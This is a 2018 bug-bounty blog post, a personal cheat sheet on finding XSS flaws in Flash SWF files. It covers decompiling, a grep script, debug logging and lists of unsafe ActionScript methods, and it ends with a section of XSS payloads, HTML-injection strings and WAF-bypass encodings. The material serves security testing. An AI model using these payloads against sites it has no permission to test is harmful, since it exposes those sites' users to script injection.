---
date: 2018-05-17
title: Find vulnerabilities in Flash SWF
images: [/images/swf-testing-xss.png]
tags:
- flash
- xss
see_also:
  -
    link: Analysing SWF files for vulnerabilities by MLT
    url: https://ret2libc.wordpress.com/2016/04/04/analysing-swf-files-for-vulnerabilities/
  -
    link: Flash it baby! by IRSDL
    url: http://media.wix.com/ugd/533dd4_c096c1fa67814318acb84d41a04fb258.pdf
  -
    link: Finding XSS vulnerabilities in flash files by Smiegles
    url: https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/
  -
    link: Setting a crossdomain.xml file for HTTP streaming
    url: https://www.adobe.com/devnet/adobe-media-server/articles/cross-domain-xml-for-streaming.html
---
As a user I would say that I don't care about all these Flash stuff that try to catch my eyes, most of the time I have a plugin to disable them.
As a developper, it reminds me the (not so good) old time when the marketing peoples always wanted to add "movement" in the website, yeah it looks so kool!
As a hacker, well... I didn't know how nice it could be, but I recently learned how to find issue in there and it's funny as hell.
I was close to the success as I quickly found 3 XSS, but unfortunately all my reports were marked as duplicate :/
<!--more-->

Below my reminder based on several articles I found here and there. For more details, I linked some of them at the very bottom of this page.


## Tools

[JPEXS Free Flash Decompiler](https://www.free-decompiler.com/flash/) to decompile the SWF files, read the code source and fully export it.  
[Flash Player Projector content](https://www.adobe.com/support/flashplayer/debug_downloads.html) standalone flash player I configured in JPEXS.  
[Flash Player Projector content debugger](https://www.adobe.com/support/flashplayer/debug_downloads.html) debug version of the standalone flash player I configured in JPEXS.  
[Flash Player Plugin content debugger](https://www.adobe.com/support/flashplayer/debug_downloads.html) to enable the debug mode of the flash plugin of the browser.  
[testflash.php](/assets/testflash.txt) a quick page I wrote to perform local tests.  

Using the debug version of the flash player (standalone or browser) and with the help of the [MacroMedia config file](https://help.adobe.com/en_US/flex/using/WS2db454920e96a9e51e63e3d11c0bf69084-7fc9.html), the flash log is enabled and will contain the trace setted by the developper:
```none
$ cat ~/mm.cfg
ErrorReportingEnable=1
TraceOutputFileEnable=1
MaxWarnings=50
AS3Trace=1
```


## Get the code


1/ Download the SWF:
```none
wget <url>
```

2/ Open SWF file with JPEXS Free Flash Decompiler  

3/ Select all:
```none
ctrl+a
```

4/ Export:
```none
right click -> export selection
```

5/ Remove duplicate files:
```none
find <export_dir> -type f -name "*_[0123456789]*" -exec rm {} \;
```

![SWF testing JPEXS](/images/swf-testing-jpexs.png)


## Extract datas

Find comments:
```none
extract-endpoints -d <export_dir> -n "" -r -e "*" -v 1 -c
```

Find hash or interesting keywords:
```none
extract-endpoints -d <export_dir> -n "" -r -e "*" -v 1 -k
```

Find endpoints:
```none
extract-endpoints -d <export_dir> -n "" -r -e "*" -v 1
```

Find almost everything that could be interesting with `flash-regexp.sh`:
```bash
#!/bin/bash

target_dir=$1

cat "flash-regexp.txt" | while read -r r; do
	echo "$r" | awk -F ";;" '{print $1" : "$2}'
	reg=`echo "$r" | awk -F ";;" '{print $3}'`
	escape_reg=$reg
	escape_reg=$(echo $escape_reg | sed "s/\"/\\\\\"/g")
	echo $escape_reg
	egrep --color -ri "$escape_reg" $target_dir
	echo
	echo
done
```

Which is basically a multitude of grep based on a list I found [there](http://www.bishopfox.com/dictionaries/Flash%20Regexes.txt):
```none
Flash XSS (HIGH);;clicktag XSS;;geturl\(.*clicktag.*\)
Flash XSS (HIGH);;getURL XSS;;geturl\(.*(_root\.|_level0\.|_global\.).*\)
Flash XSS (HIGH);;getURL XSS;;geturl\([^'".]*\)
Flash XSS (HIGH);;navigateToURL XSS;;navigateToURL\([^'".]*\)
Flash XSS (HIGH);;ExternalInterface.call XSS;;ExternalInterface\.call\(.*(_root\.|_level0\.|_global\.).*\)
...
...
```

![SWF testing extract datas](/images/swf-testing-extract-datas.png)


## Manual analysis

Enable and check the Flash log:
```none
cd /usr/lib/adobe-flashplugin
cp libflashplayer_debug.so libflashplayer.so
tail -f ~/.macromedia/Flash_Player/Logs/flashlog.txt | grep -a -v AVMINF
```

Locally run the SWF file with all parameters in the test page:
```none
firefox http://127.0.0.1/testflash/testflash.php?__swf=<MYSWF_FILE>.swf&param1=value1&param2=value2...
```

Find parameters in JPEXS and track them one by one from the initialization to the final use:
```none
ctrl+shift+F + Ignore case -> flashvars
```

Find dangerous methods in JPEXS and reverse track the parameters:
```none
ctrl+shift+F + Ignore case -> geturl
```

![SWF testing flash log](/images/swf-testing-flash-log.jpg)


## Take care of

Unsafe methods in Actionscript:
```none
loadVariables()
getURL()
getURLBlankVar()
getURLParentVar()
getURLJSParam()
loadMovie()
loadMovieVar()
loadMovieNum()
FScrollPane.loadScrollContent()
LoadVars.load 
LoadVars.send 
XML.load ( 'url' )
XML.sendAndLoad ( 'url' )
LoadVars.load ( 'url' )
LoadVars.send ( 'url' ) 
Sound.loadSound( 'url' , isStreaming );
NetStream.play( 'url' );
flash.external.ExternalInterface.call(_root.callback)
externalInterface.addCallback
htmlText
htmlVar
loadClip
AddDLL
```

Functions that can load objects, or send/receive/store data:
```none
XMLLoader, AMFService, SWFLoader, loadVariables, loadMovie,
loadMovieNum, LoadVars.load, LoadVars.send, NetStream.play,
getDefinition, getDefinition, FScrollPane.loadScrollContent, XML.load,
Sound.loadSound, NetStream.play, URLRequest, URLLoader,
URLStream, LocalConnection, SharedObject
```

Uninitialized global vars (ActionScript 2):
```none
_root
_global
_level0
```

Uninitialized global vars (ActionScript 3):
```none
root
loaderInfo
parameters
```


## XSS payloads

AS2 getURL() / AS3 NavigateToURL():
```none
javascript:alert(1)
javascript://adobe.com%0aalert(1)
data:text/html,<script>alert(1)<script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

AS2 fscommand, AS2 .watch, AS3 externalInterface.Call (like PHP preg_replace/e issue):
```none
alert`0`
%#jsinitfunctio%gn=alert%601%60
\"))-alert(1)}catch(e){}//
\"))} catch(e) {alert(1);}//
\');alert(document.domain);
\"));throw_error()}catch(e){alert(document.domain))}//
\");function%20someFunction(a){}prompt(1)//
"%5D);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
flash.external.ExternalInterface.call("alert", '1');
```

HTML injection:
```none
<img src='javascript:alert(1)//.swf'>
<a href=asfunction:System.Security.allowDomain,www.example.com>
<a href=asfunction:getURL,javascript:alert(1)>
```

WAF bypass:
```none
param1=value1
pa%Xram1=val%Yue1
pa%=ram1=val%#ue1
pa%AXram1=val%B#ue1
File.swf?%#param1=value1&p2=v2
%#jsinitfunctio%gn=alert%601%60
```

Trigger Error:
```none
xxx"'(){}\"\'(){}\\'\\"(){}xxx
```


## Other tools

[Adobe Flex SDK](https://www.adobe.com/devnet/flex/flex-sdk-download.html) to compile Actionscript (mxmlc).  
[SWFIntruder](https://github.com/irsdl/updated-SWFIntruder) to test XSS.  
[Flashbang](https://cure53.de/flashbang) to find FlashVars.  


## External resources

- [Analysing SWF files for vulnerabilities by MLT](https://ret2libc.wordpress.com/2016/04/04/analysing-swf-files-for-vulnerabilities/)
- [Flash it baby! by IRSDL](http://media.wix.com/ugd/533dd4_c096c1fa67814318acb84d41a04fb258.pdf)
- [Finding XSS vulnerabilities in flash files by Smiegles](https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/)
- [Setting a crossdomain.xml file for HTTP streaming](https://www.adobe.com/devnet/adobe-media-server/articles/cross-domain-xml-for-streaming.html)
